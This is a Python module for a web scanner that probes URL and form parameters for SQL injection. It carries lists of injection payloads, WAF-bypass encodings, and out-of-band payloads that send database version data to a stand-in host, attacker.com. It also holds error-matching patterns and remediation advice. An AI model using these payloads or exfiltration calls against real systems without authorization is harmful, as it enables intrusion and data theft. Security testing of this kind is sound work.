"""SQL Injection scanner module — detects error-based, boolean, time-based, UNION, stacked, and OOB SQLi."""

import re
import asyncio
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from typing import Optional
from datetime import datetime, timezone

from .config import Finding, Severity, FindingType, ScanConfig
from .http_client import HttpClient


# SQLi error patterns per database
ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax.*?MySQL", r"Warning.*?\Wmysqli?_", r"valid MySQL result",
        r"MySqlClient\.", r"mysql_fetch", r"mysql_num_rows",
        r"supplied argument is not a valid MySQL",
        r"check the manual that (corresponds|fits) to your MySQL server",
        r"Unknown column '[^']+' in 'order clause'",
        r"MySqlErrorException",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*?error", r"Warning.*?\Wpg_", r"valid PostgreSQL result",
        r"Npgsql\.", r"PSQLException", r"ERROR: syntax error",
        r"unterminated quoted string", r"could not prepare statement",
    ],
    "MSSQL": [
        r"ODBC SQL Server Driver", r"SQLServer JDBC", r"Driver.*?SQL[\-\_\ ]*Server",
        r"SqlException", r"System\.Data\.SqlClient",
        r"Unclosed quotation mark", r"Syntax error.*?SQL Server",
    ],
    "Oracle": [
        r"ORA-\d{5}", r"Oracle error", r"Oracle.*?Driver",
        r"oracle\.jdbc", r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"sqlite_", r"unrecognized token",
    ],
}

# Boolean-based payloads
BOOLEAN_PAYLOADS = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("' AND 'a'='a'--", "' AND 'a'='b'--"),
    (") AND 1=1--", ") AND 1=2--"),
    ("')) AND 1=1--", "')) AND 1=2--"),
    ("\" AND 1=1--", "\" AND 1=2--"),
    (" AND 1=1", " AND 1=2"),
    ("') AND 1=1--", "') AND 1=2--"),
]

# Time-based payloads
TIME_PAYLOADS = [
    "' AND SLEEP(5)--",
    "' AND (SELECT SLEEP(5))--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND pg_sleep(5)--",
    "' OR SLEEP(5)--",
    "1; SELECT pg_sleep(5)--",
    "' UNION SELECT SLEEP(5)--",
    "') AND SLEEP(5)--",
    "')) AND SLEEP(5)--",
    "\" AND SLEEP(5)--",
]

# UNION-based payloads
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT @@version,NULL,NULL--",
    "' UNION SELECT version(),NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
]

# Stacked query payloads
STACKED_PAYLOADS = [
    "'; SELECT 1--",
    "'; SELECT SLEEP(0)--",
    "'); SELECT 1--",
    "'; SELECT 1; SELECT 2--",
]

# OOB payloads
OOB_PAYLOADS = [
    "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a'))--",
    "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||@@version)--",
    "'; EXEC master..xp_dirtree 'http://attacker.com/'--+",
]

# WAF bypass encodings
WAF_BYPASS = {
    "space_comment": lambda p: p.replace(" ", "/**/"),
    "double_encode": lambda p: quote(quote(p, safe=""), safe=""),
    "case_mixed": lambda p: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
    "null_byte": lambda p: p.replace("'", "'%00"),
}


class SQLiScanner:
    """SQL Injection detection and verification."""

    def __init__(self, config: ScanConfig):
        self.config = config
        self.client = HttpClient(config)
        self.findings: list[Finding] = []
        self._baseline_cache: dict[str, str] = {}

    async def _get_baseline(self, url: str, param: str, original_value: str) -> Optional[str]:
        """Get the baseline response for comparison."""
        key = f"{url}:{param}"
        if key in self._baseline_cache:
            return self._baseline_cache[key]
        resp = await self.client.get(url)
        if resp:
            self._baseline_cache[key] = resp.text[:2000]
            return self._baseline_cache[key]
        return None

    def _check_error_patterns(self, text: str) -> Optional[tuple[str, str]]:
        """Check response for database error patterns."""
        for db, patterns in ERROR_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    return db, match.group(0)
        return None

    async def scan_param(self, url: str, param: str, method: str = "GET") -> list[Finding]:
        """Test a single parameter for SQL injection."""
        findings = []
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)

        if param not in params_dict:
            original_value = ""
        else:
            original_value = params_dict[param][0]

        baseline = await self._get_baseline(url, param, original_value)
        if not baseline:
            return findings

        # 1. Error-based detection
        for payload_list, scan_name in [
            (UNION_PAYLOADS, "UNION"),
            (STACKED_PAYLOADS, "Stacked"),
            (OOB_PAYLOADS, "OOB"),
        ]:
            for payload in payload_list:
                test_value = original_value + payload
                if method == "GET":
                    test_params = dict(params_dict)
                    test_params[param] = [test_value]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))
                    resp = await self.client.get(test_url)
                else:
                    resp = await self.client.post(url, data={param: test_value})

                if not resp:
                    continue

                error = self._check_error_patterns(resp.text)
                if error:
                    db, evidence = error
                    findings.append(Finding(
                        finding_type=FindingType.SQLI,
                        severity=Severity.CRITICAL,
                        url=url, parameter=param, payload=payload,
                        evidence=f"[{scan_name}] {db} error: {evidence}",
                        request=test_url if method == "GET" else f"POST {url} {param}={test_value}",
                        response=resp.text[:500],
                        remediation=f"Use parameterized queries/prepared statements for {param}. Never concatenate user input into SQL.",
                        confidence=0.9,
                        timestamp=datetime.now(timezone.utc).isoformat(),
                    ))
                    break

        # 2. Boolean-based detection
        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            true_value = original_value + true_payload
            false_value = original_value + false_payload

            if method == "GET":
                tp = dict(params_dict)
                tp[param] = [true_value]
                true_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                true_resp = await self.client.get(true_url)

                fp = dict(params_dict)
                fp[param] = [false_value]
                false_url = urlunparse(parsed._replace(query=urlencode(fp, doseq=True)))
                false_resp = await self.client.get(false_url)
            else:
                true_resp = await self.client.post(url, data={param: true_value})
                false_resp = await self.client.post(url, data={param: false_value})

            if not true_resp or not false_resp:
                continue

            # Compare: true condition matches baseline, false differs
            true_match = abs(len(true_resp.text) - len(baseline)) < 100
            false_diff = abs(len(false_resp.text) - len(baseline)) > 200

            if true_match and false_diff:
                findings.append(Finding(
                    finding_type=FindingType.SQLI,
                    severity=Severity.HIGH,
                    url=url, parameter=param, payload=f"{true_payload} / {false_payload}",
                    evidence=f"Boolean diff: TRUE response={len(true_resp.text)}, FALSE response={len(false_resp.text)}, baseline={len(baseline)}",
                    remediation=f"Use parameterized queries for {param}. Implement input validation.",
                    confidence=0.85,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                ))
                break

        # 3. Time-based detection
        for payload in TIME_PAYLOADS:
            test_value = original_value + payload
            start = time.monotonic()
            if method == "GET":
                tp = dict(params_dict)
                tp[param] = [test_value]
                test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                resp = await self.client.get(test_url)
            else:
                resp = await self.client.post(url, data={param: test_value})
            elapsed = time.monotonic() - start

            if resp and elapsed >= 4.5:
                findings.append(Finding(
                    finding_type=FindingType.SQLI,
                    severity=Severity.HIGH,
                    url=url, parameter=param, payload=payload,
                    evidence=f"Time-based: response took {elapsed:.2f}s (expected <2s)",
                    remediation=f"Use parameterized queries for {param}. Implement strict input validation and WAF rules.",
                    confidence=0.8,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                ))
                break

        # 4. WAF bypass attempts if no findings yet
        if not findings:
            for bypass_name, bypass_fn in WAF_BYPASS.items():
                for true_p, false_p in BOOLEAN_PAYLOADS[:3]:
                    try:
                        bp = bypass_fn(true_p)
                        test_value = original_value + bp
                        if method == "GET":
                            tp = dict(params_dict)
                            tp[param] = [test_value]
                            test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                            resp = await self.client.get(test_url)
                        else:
                            resp = await self.client.post(url, data={param: test_value})

                        if resp:
                            error = self._check_error_patterns(resp.text)
                            if error:
                                db, evidence = error
                                findings.append(Finding(
                                    finding_type=FindingType.SQLI,
                                    severity=Severity.HIGH,
                                    url=url, parameter=param, payload=f"[{bypass_name}] {bp}",
                                    evidence=f"WAF bypass ({bypass_name}): {db} error: {evidence}",
                                    remediation="Fix the underlying SQL injection AND improve WAF rules.",
                                    confidence=0.75,
                                    timestamp=datetime.now(timezone.utc).isoformat(),
                                ))
                                break
                    except Exception:
                        continue
                if findings:
                    break

        self.findings.extend(findings)
        return findings

    async def scan_url(self, url: str, params: list[dict] = None) -> list[Finding]:
        """Scan all parameters of a URL for SQL injection."""
        all_findings = []
        if params:
            for p in params:
                findings = await self.scan_param(url, p["name"])
                all_findings.extend(findings)
        else:
            parsed = urlparse(url)
            for param_name in parse_qs(parsed.query).keys():
                findings = await self.scan_param(url, param_name)
                all_findings.extend(findings)
        return all_findings

    async def scan_forms(self, forms: list[dict]) -> list[Finding]:
        """Test form fields for SQL injection."""
        all_findings = []
        for form in forms:
            for field in form["fields"]:
                if field["type"] in ("hidden", "submit", "button"):
                    continue
                findings = await self.scan_param(form["action"], field["name"], method=form["method"])
                all_findings.extend(findings)
        return all_findings

    async def close(self):
        await self.client.close()